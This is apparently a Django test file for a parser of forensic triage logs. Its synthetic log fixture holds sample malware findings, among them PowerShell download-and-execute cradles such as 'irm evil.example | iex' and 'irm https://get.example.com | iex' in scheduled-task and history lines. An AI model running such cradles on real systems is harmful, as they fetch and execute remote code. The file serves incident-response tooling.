"""Spor 0.8.1 log shapes (spor_log.py, correlations/spor_source.py): SUMMARY
findings repeated at several times as one line ("+N more times since"), the
task line with "=> arguments", DLL side-loading as one line per program with
its DLLs on "dll:" sub-lines, "[Signature] <file> => invalid signature: ...",
the PowerShell history's "command:" sub-lines, and the new flags."""

from django.test import SimpleTestCase

from .. import spor_log
from ..correlations.spor_self import self_links, self_status

ROAMING = 'C:\\Users\\Ann\\AppData\\Roaming'
HOST = ROAMING + '\\uTorrent Web\\utweb.exe'
DLL = ROAMING + '\\uTorrent Web\\avformat-58.dll'
DRIVER = 'C:\\Windows\\System32\\drivers\\kvckiller.sys'
PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
TASK = '\\Microsoft\\Windows\\Guard\\HealthCheckerV1-abcdef'
STEAM = 'C:\\Games\\Kingdom Come - Deliverance\\Bin\\Win64Shared\\steam_api64.dll'
NODE = 'C:\\Windows\\System32\\HealthCheckerV1-abcdef\\node.exe'

SPOR = '\n'.join([
    '==================== Spor 0.8.1 - forensic triage log ==============================================',
    'Created:   2026-11-26 10:00:00 UTC (local time 11:00, UTC+01:00)',
    'Users:     Ann',
    'Times:     UTC, except created and modified in FILES (local time of this PC, as FRST shows them)',
    '',
    '==================== SUMMARY - flagged items; details in the sections below ========================',
    '(line: time [from] item [status] => details <==== flags)',
    '',
    f'2026-11-01 02:37:47 [Persistence] service installed: wsftprm: {DRIVER} [gone] => +81 more times since 2026-10-25 10:22'
    ' <==== !in-defender-exclusion',
    f'2026-05-18 16:10:01 [Persistence] task {TASK}: {PS} => arguments -nop -Command "irm evil.example | iex"'
    ' <==== !lolbin !suspicious',
    f'2026-04-17 06:48:18 [Persistence] DLL side-loading: {HOST} (signed by BitTorrent Inc) => side-loads avformat-58.dll, avutil.dll'
    ' <==== !sideload',
    f'    dll: {DLL} [unsigned] => proxy DLL',
    '2026-11-22 16:32:46 [ClickFix] PowerShell history ConsoleHost_history.txt => 4 suspicious lines <==== !suspicious',
    '    command: irm https://get.example.com | iex',
    f'2026-11-24 08:26:57 [timeline PROC] {NODE} => running, pid 15196 <==== !interpreter-outside',
    f'[Signature] {STEAM} => invalid signature: file changed after signing (bad digest); signer Valve Corp. <==== !invalid-signature',
    '2026-11-02 08:00:00 [Persistence] task \\Updater (hidden): C:\\Users\\Ann\\u\\u.exe [unsigned] <==== !hidden-task',
    '2026-11-16 11:31:51 [Persistence] service installed: MBAMProtection: C:\\Windows\\System32\\drivers\\mbam.sys [gone]'
    ' => +19 more times since 2026-11-01 09:05 <==== !new-service',
    '2026-09-22 00:27:27 [Remote access] remote access tool folder C:\\Program Files (x86)\\UltraViewer\\ <==== !remote-access',
    '',
    '==================== TIMELINE - last 30 days, oldest first =========================================',
    '',
    '2026-11-03 09:00:00 [TSK] task \\Cradle created: powershell  -nop -c "irm x | iex"',
    '2026-11-03 09:00:01 [SVC] service Evil (auto) changed: cmd.exe /c start x',
    f'2026-11-24 08:26:57 [PROC] {NODE} => running, pid 15196 <==== !interpreter-outside',
    f'2026-11-01 02:37:47 [SVC] {DRIVER} [gone] => service wsftprm installed; +81 more times since 2026-10-25 10:22'
    ' <==== !in-defender-exclusion',
    '',
    '==================== PERSISTENCE - Run keys, services, scheduled tasks, Startup folders, WMI, with times ====',
    '--- Scheduled tasks ---',
    '',
    f'2026-05-18 16:10:01 [task] {TASK} => changed 2026-11-10 09:00:58 <==== !lolbin !suspicious',
    f'    program: {PS}',
    '    arguments: -nop -Command "irm evil.example | iex"',
    '2026-11-02 08:00:00 [task] \\Updater => C:\\Users\\Ann\\u\\u.exe [unsigned]',
    '2026-11-03 09:00:00 [task] \\Cradle',
    '    program: powershell',
    '',
    '--- Services and drivers ---',
    '',
    '2026-11-03 09:00:01 [service] Evil => cmd.exe, start auto',
    '',
    '==================== TIMESTOMPING - timestamps set in the last 30 days ==============================',
    '',
    '2026-11-20 10:00:00 C:\\Program Files\\Lenovo\\Addins\\a.dll => B 2025-03-01 10:00:00.0000000',
    '    same times: 59 more files in this folder: b.dll, c.dll',
    '',
    '==================== FILES - SHA256, signature and version of the files as they are on disk now ====',
    '',
    f'{HOST} => {"11" * 32}, signature valid; signer BitTorrent Inc',
    f'{DLL} => {"22" * 32}, signature unsigned',
    f'{STEAM} => {"33" * 32}, signature invalid; signer Valve Corp.; note file changed after signing (bad digest)',
    f'{NODE} => {"44" * 32}, signature valid; signer OpenJS Foundation',
    '',
    '==================== LEGEND ========================================================================',
    '==================== End of log. Scan took 9.9 s ====',
])
LINES = SPOR.split('\n')


def no_of(prefix, start=0):
    return next(no for no, text in enumerate(LINES, start=1) if no > start and text.strip().startswith(prefix))


def linked(links, no):
    return {entry['line_no']: entry.get('match') for entry in links.get(str(no), ())}


def summary_item(prefix):
    no = no_of(prefix)
    return dict(spor_log.iter_summary_items(LINES))[no]


def files_line(path):
    return no_of(path + ' => ', no_of('==================== FILES'))


class ShapeTests(SimpleTestCase):
    def test_a_repeated_finding_keeps_its_status_and_flags(self):
        item = summary_item('2026-11-01 02:37:47 [Persistence]')
        self.assertEqual(item.status, 'gone')
        self.assertEqual(item.rest, '+81 more times since 2026-10-25 10:22')
        self.assertEqual(item.flags, ['!in-defender-exclusion'])

    def test_a_task_line_has_its_arguments_as_details(self):
        item = summary_item('2026-05-18 16:10:01 [Persistence]')
        self.assertEqual(item.item, f'task {TASK}: {PS}')
        self.assertTrue(item.rest.startswith('arguments -nop'))
        self.assertEqual(item.flags, ['!lolbin', '!suspicious'])

    def test_an_invalid_signature_line_is_about_its_file(self):
        item = summary_item('[Signature]')
        self.assertEqual(item.item, STEAM)
        self.assertTrue(item.rest.startswith('invalid signature: file changed'))

    def test_the_new_flags_have_their_tiers(self):
        self.assertEqual(spor_log.flag_tier('!abused-tld'), 'hint')
        for flag in ('!interpreter-outside', '!renamed-persisted', '!defender-detected', '!in-defender-exclusion',
                     '!invalid-signature', '!vulnerable-driver', '!random-name', '!hidden-task'):
            self.assertEqual(spor_log.flag_tier(flag), 'strong', flag)
        for flag in ('!remote-access', '!account-change', '!history-deleted', '!disk-image', '!upload', '!new-service',
                     '!task-deleted', '!startup-item'):
            self.assertEqual(spor_log.flag_tier(flag), 'info', flag)
        self.assertEqual(spor_log.worst_tier(['!new-service', '!lolbin']), 'info')
        self.assertEqual(spor_log.worst_tier(['!new-service', '!sideload']), 'strong')

    def test_the_info_box_knows_every_hint_and_context_flag(self):
        # static/js/correlation_info.js keeps its own copy (the info colour): it must not drift from spor_log
        import re
        from pathlib import Path
        js = (Path(__file__).resolve().parents[2] / 'static' / 'js' / 'correlation_info.js').read_text(encoding='utf-8')
        block = re.search(r'const HINT_FLAGS = new Set\(\[(.*?)\]\);', js, re.S).group(1)
        self.assertEqual(set(re.findall(r"'(![a-z-]+)'", block)), set(spor_log.HINT_FLAGS | spor_log.INFO_FLAGS))

    def test_a_policy_path_exclusion_is_a_folder(self):
        lines = [
            '==================== Spor 0.8.1 - forensic triage log ====',
            '==================== DEFENDER - detections, exclusions, settings ====',
            '--- Defender exclusions (current) ---',
            '2026-11-22 15:57:51 [Paths (policy)] C:\\ProgramData <==== !defender-exclusion',
        ]
        [mention] = [m for m in spor_log.iter_mentions(lines) if m.path == 'C:\\ProgramData']
        self.assertTrue(mention.folder)

    def test_a_context_line_is_no_evidence(self):
        from ..correlations.entries import evidence_severity
        item = summary_item('2026-11-16 11:31:51 [Persistence]')
        self.assertEqual(item.flags, ['!new-service'])
        self.assertEqual(item.strong_flags, [])
        self.assertEqual(evidence_severity(item.flags, ''), 'i')
        links = self_links('spor', SPOR)
        for prefix in ('2026-11-16 11:31:51 [Persistence]', '2026-09-22 00:27:27 [Remote access]'):
            self.assertEqual(self_status(links.get(str(no_of(prefix)), [])), '', prefix)


class LinkTests(SimpleTestCase):
    def setUp(self):
        self.links = self_links('spor', SPOR)

    def test_a_repeated_service_install_links_its_timeline_line(self):
        summary = no_of('2026-11-01 02:37:47 [Persistence]')
        self.assertIn(no_of('2026-11-01 02:37:47 [SVC]'), linked(self.links, summary))

    def test_a_task_finding_links_its_task(self):
        summary = no_of('2026-05-18 16:10:01 [Persistence]')
        self.assertEqual(linked(self.links, summary)[no_of('2026-05-18 16:10:01 [task]')], 'task')

    def test_side_loading_links_the_program_and_its_dll(self):
        summary = no_of('2026-04-17 06:48:18 [Persistence] DLL side-loading')
        self.assertIn(files_line(HOST), linked(self.links, summary))
        dll_line = no_of('dll: ' + DLL)
        self.assertIn(files_line(DLL), linked(self.links, dll_line))

    def test_an_invalid_signature_links_and_rates(self):
        summary = no_of('[Signature]')
        self.assertIn(files_line(STEAM), linked(self.links, summary))
        self.assertEqual(self_status(self.links[str(summary)]), '!')

    def test_an_interpreter_outside_its_folder_rates_its_files_line(self):
        files = files_line(NODE)
        self.assertEqual(self_status(self.links[str(files)]), '!')

    def test_a_hidden_tasks_finding_links_its_task(self):
        from ..correlations.spor_source import build
        summary = no_of('2026-11-02 08:00:00 [Persistence]')
        # under the task's key without " (hidden)" (the link itself shows the stronger match: the same file)
        self.assertIn('task:updater', build('spor', LINES).by_line[summary])
        self.assertIn(no_of('2026-11-02 08:00:00 [task]'), linked(self.links, summary))

    def test_task_and_service_events_without_a_file_link_their_entry(self):
        self.assertEqual(linked(self.links, no_of('2026-11-03 09:00:00 [TSK]'))[no_of('2026-11-03 09:00:00 [task]')], 'task')
        self.assertEqual(linked(self.links, no_of('2026-11-03 09:00:01 [SVC]'))[no_of('2026-11-03 09:00:01 [service]')], 'service')

    def test_a_timestomping_batch_keeps_its_names_as_extra(self):
        mentions = [m for m in spor_log.iter_mentions(LINES) if m.path.endswith('a.dll')]
        self.assertEqual(mentions[0].extra, [['same times', '59 more files in this folder: b.dll, c.dll']])
